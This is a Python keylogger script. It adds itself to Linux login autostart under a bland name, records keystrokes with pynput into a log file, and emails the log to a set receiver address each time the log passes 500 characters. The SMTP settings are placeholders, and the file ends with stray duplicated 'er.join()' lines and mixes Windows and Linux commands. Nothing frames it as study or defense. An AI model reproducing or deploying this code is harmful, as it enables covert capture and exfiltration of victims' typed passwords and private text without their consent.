from pynput import keyboard
import time
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


executable_path = "keylogger.exe"

autostart_path = os.path.expanduser("~/.config/autostart")
desktop_entry_path = os.path.join(autostart_path, "my_program.desktop")

os.makedirs(autostart_path, exist_ok=True)

desktop_entry_content = f"""[Desktop Entry]
Type=Application
Exec={executable_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=My Program
Comment=Starts my program at login
"""

try:
    with open(desktop_entry_path, "w") as desktop_file:
        desktop_file.write(desktop_entry_content)
    print("Program added to startup successfully!")
except Exception as e:
    print(f"Failed to add program to startup: {e}")

log_file = "key_log.txt"



time.sleep(2)
os.system('cls')

sender_email = "fruit@meka.com"
sender_email = "jkjhghjgkgkgkjgjgkgk"
receiver_email = "jayman@mela.com"
smtp_server = "90"
smtp_port = "90"
smtp_password = "ffffffffffffffffffffffffffff"

def send_email(content, subject):
    """Send an email with the given content and subject."""
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg['Subject'] = subject

        msg.attach(MIMEText(content, 'plain'))

        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls() 
            server.login(sender_email, smtp_password)
            server.send_message(msg)

        print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")
file=open(log_file,'w')
file.close()
def on_press(key):
    """Handles key presses and writes them to the log file."""
    try: 
        with open(log_file, "r+") as file:
            content = file.read()
            if len(content) > 500:
                send_email(content, "Keylogger Alert: Log File Exceeded 500 Characters")
                file.seek(0)  # Clear the file after sending
                file.truncate()

            # Log the key press
            if key == keyboard.Key.space:
                file.write(" ")
            elif key == keyboard.Key.backspace:
                pass  
            elif key == keyboard.Key.enter:
                file.write("\n")
            elif hasattr(key, 'char') and key.char is not None and key.char.isalpha():
                file.write(f"{key.char}")
            else:
                pass
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f"[{key}]")

def on_release(key):
    """Stop listening when the ESC key is pressed."""
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
er.join()

er.join()
